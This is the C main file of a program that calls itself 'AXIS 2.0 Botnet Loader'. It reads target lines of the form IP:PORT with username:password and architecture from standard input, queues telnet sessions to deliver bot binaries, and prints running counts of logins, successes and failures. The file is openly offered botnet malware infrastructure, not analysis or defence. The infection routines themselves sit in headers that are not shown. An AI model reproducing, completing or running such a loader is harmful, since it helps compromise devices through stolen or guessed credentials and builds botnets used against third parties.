#include "includes.h"
#include "server.h"
#include "binary.h"
#include "util.h"
#include "connection.h"

static struct server *srv;
static int epoll_fd;
static int listen_fd;

static void stats_thread(void *arg);
static void event_thread(void *arg);

int main(int argc, char **args) {
    struct sockaddr_in addr;
    int opt = 1;

    printf("AXIS 2.0 Botnet Loader\n");
    printf("========================\n\n");

    if (!binary_init()) {
        printf("Failed to load binaries!\n");
        return 1;
    }

    srv = server_create();
    if (srv == NULL) {
        printf("Failed to create server!\n");
        return 1;
    }

    epoll_fd = epoll_create(1);
    if (epoll_fd == -1) {
        perror("epoll_create");
        return 1;
    }

    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd == -1) {
        perror("socket");
        return 1;
    }

    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    fcntl(listen_fd, F_SETFL, O_NONBLOCK);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(0);

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        perror("bind");
        return 1;
    }

    pthread_t stats_thread_id;
    pthread_create(&stats_thread_id, NULL, (void *(*)(void *))stats_thread, NULL);

    pthread_t event_thread_id;
    pthread_create(&event_thread_id, NULL, (void *(*)(void *))event_thread, NULL);

    printf("Loader ready. Feed IPs via stdin.\n");
    printf("Format: IP:PORT username:password [architecture]\n\n");

    char line[4096];
    while (fgets(line, sizeof(line), stdin) != NULL) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = 0;

        if (strlen(line) == 0) continue;

        server_queue_telnet(srv, line);
    }

    pthread_join(event_thread_id, NULL);

    return 0;
}

static void event_thread(void *arg) {
    struct epoll_event events[128];

    while (TRUE) {
        int n = epoll_wait(epoll_fd, events, 128, 100);
        if (n == -1) {
            if (errno == EINTR) continue;
            break;
        }

        for (int i = 0; i < n; i++) {
            struct connection *conn = (struct connection *)events[i].data.ptr;
            if (conn != NULL)
                connection_handler(conn);
        }
    }
}

static void stats_thread(void *arg) {
    time_t last = time(NULL);

    while (TRUE) {
        sleep(1);

        time_t now = time(NULL);
        if (now - last >= 5) {
            printf("\r\033[K[%ld] Conn: %d | Logins: %d | Success: %d | Fail: %d",
                now,
                srv->curr_open,
                srv->total_logins,
                srv->total_successes,
                srv->total_fails);
            fflush(stdout);
            last = now;
        }
    }
}
